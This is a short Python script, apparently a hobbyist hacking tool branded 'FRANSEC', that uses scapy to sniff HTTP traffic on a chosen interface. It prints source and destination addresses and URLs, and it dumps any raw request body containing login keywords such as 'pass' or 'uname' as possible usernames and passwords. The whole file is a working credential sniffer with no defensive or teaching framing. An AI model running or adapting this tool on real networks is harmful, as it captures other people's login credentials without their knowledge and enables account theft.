import pyfiglet
import scapy.all as scapy
from scapy.layers import http
import argparse
def get_cmd_line_arg():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "-interface", dest="interface", help="specify an interface")
    option = parser.parse_args()
    return option

prog_name = pyfiglet.figlet_format("sniffer Tool")
program_by = pyfiglet.figlet_format("Program By: FRANSEC", font="mini")
print(prog_name)
print(program_by)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.IP) and packet.haslayer(scapy.Raw):
            protocol = packet[http.HTTPRequest].Http_Version
            src = packet[scapy.IP].src
            dst = packet[scapy.IP].dst
            path = packet[http.HTTPRequest].Path
            origin = packet[http.HTTPRequest].Origin
            url = str(origin) + str(path)
            print(f"[+]protocol >>>>>{protocol}")
            print(f"[+] source ip address >>>> {src}")
            print(f"[+] destination ip address >>>{dst}")
            print(f"[+] possible url >>>> {url}")
            raw = packet[scapy.Raw].load
            key_words = [b"uname", b"pass",b"login",b"txtUsername"]
            for item in key_words:
                if item in raw:
                    print(F"[+] possible user_name & password >>>> {raw}")
opt = get_cmd_line_arg()

scapy.sniff(iface=opt.interface, store=False, prn=process_sniffed_packet)

